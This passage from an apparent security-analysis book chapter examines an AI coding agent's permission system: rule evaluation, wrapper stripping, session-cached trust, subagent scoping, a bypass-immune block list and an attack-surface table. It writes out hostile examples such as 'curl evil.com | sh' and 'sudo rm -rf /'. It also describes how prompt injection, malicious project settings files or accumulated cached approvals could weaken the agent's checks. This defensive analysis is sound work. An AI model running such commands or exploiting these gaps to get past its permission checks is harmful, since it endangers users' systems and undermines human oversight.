+<p>The asymmetry is critical: <strong>deny is evaluated per-segment (any match blocks all), allow requires all segments to match.</strong> This prevents an attacker from hiding a dangerous command behind an allowed prefix: <code>git status &amp;&amp; curl evil.com | sh</code> is denied even though <code>git status</code> is allowed.</p>
+<h3 id="wrapper-stripping">Wrapper Stripping</h3>
+<p>Commands prefixed with <code>sudo</code>, <code>env</code>, <code>nohup</code>, <code>time</code>, or <code>nice</code> are stripped to their base command before matching. <code>sudo rm -rf /</code> is matched as <code>rm -rf /</code>. <code>env VAR=val python script.py</code> is matched as <code>python script.py</code>.</p>
+<p><strong>Security implication:</strong> Wrapper stripping prevents privilege escalation wrappers from hiding the actual command. But it also means that <code>sudo</code> is stripped silently rather than blocked. In practice, <code>sudo</code> is independently blocked by the BashValidator (hard-deny for privilege escalation), but the stripping logic in the permission matcher operates independently from the validator. If the validator is ever bypassed, the permission matcher would evaluate the inner command without registering that <code>sudo</code> was involved.</p>
+<hr />
+<h2 id="45-the-evaluation-algorithm">4.5 The Evaluation Algorithm</h2>
+<p>The evaluation algorithm is the heart of the permission system. It implements deny-beats-ask-beats-allow with first-match semantics across eight prioritized sources.</p>
+<h3 id="pseudocode">Pseudocode</h3>
+<div class="codehilite"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span>tool_call<span class="p">):</span>
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Phase</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span><span class="w"> </span><span class="n">Bypass</span><span class="o">-</span><span class="n">immune</span><span class="w"> </span><span class="n">checks</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">tool_call</span><span class="w"> </span><span class="nb">matches</span><span class="w"> </span><span class="n">HARDCODED_BLOCK_LIST</span><span class="p">:</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">DENY</span><span class="w">  </span><span class="o">//</span><span class="w"> </span><span class="n">Non</span><span class="o">-</span><span class="n">configurable</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Phase</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="n">Mode</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">short</span><span class="w"> </span><span class="n">circuits</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nb">mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">bypass</span><span class="p">:</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">ALLOW</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nb">mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">deny</span><span class="o">-</span><span class="nb">all</span><span class="p">:</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">DENY</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nb">mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">plan</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">tool</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nb">write</span><span class="p">:</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">DENY</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nb">mode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">plan</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">tool</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nb">read</span><span class="p">:</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">ALLOW</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Phase</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="n">Rule</span><span class="w"> </span><span class="n">cascade</span><span class="w"> </span><span class="p">(</span><span class="n">default</span><span class="p">,</span><span class="w"> </span><span class="n">auto</span><span class="p">,</span><span class="w"> </span><span class="n">custom</span><span class="w"> </span><span class="n">modes</span><span class="p">)</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="p">[</span><span class="n">policy</span><span class="p">,</span><span class="w"> </span><span class="n">managed</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">project</span><span class="p">,</span><span class="w"> </span><span class="n">local</span><span class="p">,</span><span class="w"> </span><span class="n">plugin</span><span class="p">,</span><span class="w"> </span><span class="n">hook</span><span class="p">,</span><span class="w"> </span><span class="nb">builtin</span><span class="p">]:</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">rule</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">source</span><span class="p">.</span><span class="n">deny_rules</span><span class="p">:</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="n">rule</span><span class="p">.</span><span class="n">matches</span><span class="p">(</span><span class="n">tool_call</span><span class="p">):</span>
+<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">DENY</span><span class="p">(</span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="n">rule</span><span class="p">)</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">rule</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">source</span><span class="p">.</span><span class="n">ask_rules</span><span class="p">:</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="n">rule</span><span class="p">.</span><span class="n">matches</span><span class="p">(</span><span class="n">tool_call</span><span class="p">):</span>
+<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">ASK</span><span class="p">(</span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="n">rule</span><span class="p">)</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">rule</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">source</span><span class="p">.</span><span class="n">allow_rules</span><span class="p">:</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="n">rule</span><span class="p">.</span><span class="n">matches</span><span class="p">(</span><span class="n">tool_call</span><span class="p">):</span>
+<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">ALLOW</span><span class="p">(</span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="n">rule</span><span class="p">)</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Phase</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">rule</span><span class="w"> </span><span class="n">matched</span><span class="w"> </span>—<span class="w"> </span><span class="n">apply</span><span class="w"> </span><span class="n">default</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">tool</span><span class="p">.</span><span class="n">readOnlyHint</span><span class="p">:</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ALLOW</span><span class="w">  </span><span class="o">//</span><span class="w"> </span><span class="n">Reads</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">safe</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">default</span>
+<span class="w">    </span><span class="k">else</span><span class="p">:</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ASK</span><span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Writes</span><span class="w"> </span><span class="n">prompt</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span>
+</code></pre></div>
+
+<h3 id="why-first-match-wins">Why First-Match-Wins</h3>
+<p>The evaluation uses first-match-wins within the priority hierarchy, not most-specific-wins. This is a deliberate departure from systems like CSS specificity or firewall rule ordering.</p>
+<p>Most-specific-wins creates emergent behavior that is hard to debug. Consider:</p>
+<div class="codehilite"><pre><span></span><code>Source 4 (project): allow Write(**)          # allow writing anywhere
+Source 4 (project): deny  Write(vendor/**)   # except vendor
+Source 5 (local):   allow Write(vendor/patches/**)  # but allow vendor patches
+</code></pre></div>
+
+<p>With most-specific-wins, the specificity of <code>vendor/patches/**</code> vs. <code>vendor/**</code> vs. <code>**</code> determines the outcome, and that ranking depends on the specificity algorithm's implementation. Different algorithms (longest prefix, deepest glob, most literal characters) produce different results.</p>
+<p>With first-match-wins and source priority, the behavior is mechanical: Source 4's deny for <code>vendor/**</code> fires before Source 5's allow for <code>vendor/patches/**</code> because Source 4 has higher priority. The result is always DENY, regardless of specificity. To allow <code>vendor/patches/**</code>, the allow rule must be placed at Source 4 or higher.</p>
+<p><strong>Security implication:</strong> First-match-wins is more restrictive but more predictable. A deny rule at a high-priority source cannot be overridden by any lower-priority source. This makes the system easier to audit: you scan sources top-down and the first matching rule is the decision. There is exactly one rule responsible for every decision.</p>
+<h3 id="the-decision-trace">The Decision Trace</h3>
+<p>Every permission decision produces a trace for debugging:</p>
+<div class="codehilite"><pre><span></span><code>Permission decision for: Bash(&quot;docker build -t myapp .&quot;)
+
+Source     | Rules Checked              | Match?
+-----------|---------------------------|--------
+policy     | (none)                    | -
+managed    | (none)                    | -
+user       | deny: Bash(docker rm <span class="gs">*)   | No match</span>
+<span class="gs">           | allow: Bash(docker build *</span>)| MATCH → ALLOW
+project    | (not reached)             | -
+...
+
+Decision: ALLOW (source: user, rule: &quot;Bash(docker build *)&quot;)
+</code></pre></div>
+
+<p>This trace is accessible via <code>--permission-debug</code> and is essential for diagnosing unexpected denials. Without it, permission debugging degenerates into trial and error.</p>
+<hr />
+<h2 id="45-session-memory-and-progressive-trust">4.5 Session Memory and Progressive Trust</h2>
+<p>The session memory cache transforms the permission system from theoretically correct but practically unusable into something developers actually tolerate.</p>
+<h3 id="how-session-memory-works">How Session Memory Works</h3>
+<p>When the user approves a tool call in default mode, the system extracts a pattern from the approved command and caches the approval:</p>
+<div class="codehilite"><pre><span></span><code>User approves: Bash(&quot;git diff --cached&quot;)
+System caches: Bash(git diff <span class="gs">*) → ALLOW</span>
+
+<span class="gs">User approves: Write(&quot;src/components/Button.tsx&quot;)</span>
+<span class="gs">System caches: Write(src/*</span>*) → ALLOW  (generalized from specific path)
+</code></pre></div>
+
+<p>Pattern generalization is risk-aware. Read-only commands generalize broadly (<code>git diff --cached</code> → <code>git *</code>), because all git-read operations have similar risk profiles. Write commands generalize narrowly (<code>src/components/Button.tsx</code> → <code>src/**</code>), because write targets vary dramatically in risk.</p>
+<h3 id="cache-properties">Cache Properties</h3>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Behavior</th>
+<th>Rationale</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Scope</td>
+<td>Session-only</td>
+<td>A session compromise cannot permanently weaken permissions</td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>Resets on session end, <code>/clear</code>, mode change</td>
+<td>Clean slate per session</td>
+</tr>
+<tr>
+<td>Generalization</td>
+<td>Risk-aware pattern widening</td>
+<td>Balance usability with precision</td>
+</tr>
+<tr>
+<td>Override</td>
+<td>Cannot override deny rules</td>
+<td>Deny is absolute regardless of cache</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-progressive-trust-problem">The Progressive Trust Problem</h3>
+<p>Session memory creates a progressive trust accumulation. As the session continues, more patterns are cached, fewer prompts appear, and the effective security posture weakens. At minute 1, the user evaluates every action. At minute 90, most actions auto-approve through cache hits.</p>
+<p>This is by design --- it aligns prompt frequency with user attention. But it creates a vulnerability window: if the model's behavior changes late in a session (due to context poisoning, prompt injection, or model drift), the accumulated cache may auto-approve operations the user would reject if prompted fresh.</p>
+<p><strong>Mitigations:</strong>
+1. <strong>Risk-based cache bypass.</strong> High-risk operations (flagged by the command classifier as Destructive) always prompt, regardless of cache.
+2. <strong>Cache TTL.</strong> Cache entries can optionally expire after N minutes of inactivity, forcing re-approval for patterns not recently used.
+3. <strong>Anomaly detection.</strong> Operations that differ significantly from the session's established patterns trigger fresh prompts even when the pattern technically matches a cached rule.</p>
+<hr />
+<h2 id="46-subagent-permission-scoping">4.6 Subagent Permission Scoping</h2>
+<p>When the main agent spawns a subagent, the subagent's permissions are strictly scoped. Two principles govern this:</p>
+<p><strong>No privilege escalation.</strong> A subagent cannot have more permissions than its parent. If the parent runs in default mode, the subagent cannot run in bypass mode. If the parent denies <code>Write(.env)</code>, the subagent inherits that denial.</p>
+<p><strong>Clean permission slate.</strong> Session-memory approvals from the parent do not transfer to the subagent. Each subagent starts with only the permissions explicitly granted in its agent definition. The rationale: session memory represents the user's trust in the parent agent's judgment. That trust does not automatically extend to subagents with different system prompts and behavioral tendencies.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">flowchart</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">Parent</span><span class="p">[</span><span class="s2">&quot;Parent Agent&lt;br/&gt;mode: auto&lt;br/&gt;cache: [git *, npm test]&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">Sub1</span><span class="p">[</span><span class="s2">&quot;Subagent 1&lt;br/&gt;tools: Read, Grep&lt;br/&gt;cache: empty&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">Parent</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">Sub2</span><span class="p">[</span><span class="s2">&quot;Subagent 2&lt;br/&gt;tools: Read, Bash&lt;br/&gt;cache: empty&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">Sub1</span><span class="w"> </span><span class="o">-.-</span><span class="w"> </span><span class="n">N1</span><span class="p">[</span><span class="s2">&quot;Cannot access Write, Bash&lt;br/&gt;Must re-earn cache&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">Sub2</span><span class="w"> </span><span class="o">-.-</span><span class="w"> </span><span class="n">N2</span><span class="p">[</span><span class="s2">&quot;Bash available but&lt;br/&gt;no cached approvals&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">Parent</span><span class="w"> </span><span class="n">fill</span><span class="p">:</span><span class="c1">#2266cc,color:#fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">Sub1</span><span class="w"> </span><span class="n">fill</span><span class="p">:</span><span class="c1">#44aa22,color:#fff</span>
+<span class="w">    </span><span class="n">style</span><span class="w"> </span><span class="n">Sub2</span><span class="w"> </span><span class="n">fill</span><span class="p">:</span><span class="c1">#cc6622,color:#fff</span>
+</code></pre></div>
+
+<p><strong>Security implication:</strong> Subagent permission scoping is the primary defense against confused deputy attacks in multi-agent architectures. A malicious MCP tool result that tricks the parent into spawning a subagent cannot leverage the parent's accumulated trust.</p>
+<hr />
+<h2 id="47-the-bypass-immune-layer">4.7 The Bypass-Immune Layer</h2>
+<p>Certain protections remain active even in bypass mode. These constitute the absolute security floor:</p>
+<table>
+<thead>
+<tr>
+<th>Protection</th>
+<th>What It Guards</th>
+<th>Mode Override?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hardcoded block list</td>
+<td><code>rm -rf /</code>, fork bombs, <code>curl \| sh</code></td>
+<td>No --- active in all modes</td>
+</tr>
+<tr>
+<td><code>.git/</code> directory write protection</td>
+<td>Repository integrity</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>.claude/</code> write protection</td>
+<td>Agent configuration integrity</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Shell config file protection</td>
+<td><code>.bashrc</code>, <code>.zshrc</code>, <code>.profile</code></td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>sudo</code> / privilege escalation block</td>
+<td>Root access prevention</td>
+<td>No</td>
+</tr>
+</tbody>
+</table>
+<p>These bypass-immune checks execute before the mode is consulted. Even a <code>settings.json</code> with <code>"permissions": {"allow": ["Bash(*)"]}</code> cannot override them. They are the final defense against configuration errors, compromised settings files, and overly permissive policies.</p>
+<p><strong>Residual risk:</strong> The bypass-immune layer protects known critical paths. It does not protect unknown critical paths. A user's <code>~/.aws/credentials</code> is not in the bypass-immune list (it may be covered by a deny rule, but deny rules are configurable). If all deny rules are removed, AWS credentials become readable. The bypass-immune layer only covers the hardcoded set.</p>
+<hr />
+<h2 id="48-permission-system-attack-surface">4.8 Permission System Attack Surface</h2>
+<p>The permission system itself is an attack target. Every component introduces its own vulnerability surface:</p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Attack Vector</th>
+<th>CWE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Rule cascade</td>
+<td>Priority confusion leading to unintended allow</td>
+<td>CWE-863</td>
+</tr>
+<tr>
+<td>Glob matching</td>
+<td>Overly broad patterns granting excessive access</td>
+<td>CWE-285</td>
+</tr>
+<tr>
+<td>Project settings</td>
+<td>Malicious <code>.claude/settings.json</code> in cloned repo</td>
+<td>CWE-15</td>
+</tr>
+<tr>
+<td>Session cache</td>
+<td>Progressive trust weakening over long sessions</td>
+<td>CWE-613</td>
+</tr>
+<tr>
+<td>Wrapper stripping</td>
+<td>Incomplete stripping allowing command hiding</td>
+<td>CWE-78</td>
+</tr>
+<tr>
+<td>Mode selection</td>
+<td>User choosing bypass on unsandboxed environment</td>
+<td>CWE-269</td>
+</tr>
+<tr>
+<td>Pattern decomposition</td>
+<td>Incomplete splitting of compound commands</td>
+<td>CWE-77</td>
+</tr>
+<tr>
+<td>Hook decisions</td>
+<td>Compromised hook allowing dangerous operations</td>
+<td>CWE-829</td>
+</tr>
+</tbody>
+</table>
+<p>Chapter 6 provides detailed attack scenarios and mitigations for each vector.</p>
+<hr />
+<h2 id="security-assessment">Security Assessment</h2>
+<p><strong>Strengths:</strong>
+- Deny-first evaluation with eight prioritized sources is architecturally sound. The first-match-wins semantics are predictable and auditable.
+- The bypass-immune layer provides a non-configurable safety floor that survives configuration compromise.
+- Subagent permission scoping implements least authority correctly, preventing privilege escalation across agent boundaries.
+- The decision trace makes every permission decision debuggable.</p>
+<p><strong>Weaknesses:</strong>
+- The project settings source (Source 4) is a supply-chain attack vector. The approval gate mitigates but does not eliminate the risk because users tend to approve without thorough review.
+- Session memory progressive trust creates a growing vulnerability window as sessions continue. The risk-based cache bypass only covers commands classified as Destructive --- commands classified as Write but actually dangerous can still benefit from cached approvals.
+- The glob grammar is powerful enough to create unintended permissions but not expressive enough to create precise policies. There is no way to express "allow <code>git push</code> only to non-protected branches" in glob syntax.
+- No formal verification of rule interactions. The system relies on testing and the decision trace for correctness validation. For complex multi-source configurations, emergent behavior is possible and difficult to predict.
+- Bypass mode has no runtime sandbox verification. The flag-length defense against accidental activation is insufficient for environments where scripts automate Claude Code invocation.</p>
+<p><strong>Research Gaps:</strong>
+- Formal policy verification: Can we prove that a given set of rules across eight sources never permits a specific operation? Tools like Alloy or TLA+ could model the rule cascade and check safety properties.
+- Contextual permission scoping: Rules that consider not just <em>what</em> tool is called but <em>why</em> --- linking permissions to the user's stated intent rather than the command's syntactic form.
+- Temporal permission decay: Automatic tightening of session-cached permissions as session duration increases, counteracting progressive trust accumulation.
+- Cross-session permission learning: Using historical approval patterns to suggest rule configurations that match the user's actual behavior, reducing both over-permission and prompt fatigue.</p>
+<div class="chapter-nav">
+  <a href="chapter-03.html">&larr; Previous</a>
+  <a href="index.html">Table of Contents</a>
+  <a href="chapter-05.html">Next &rarr;</a>
+</div>
+</div>
+</body>
+</html>
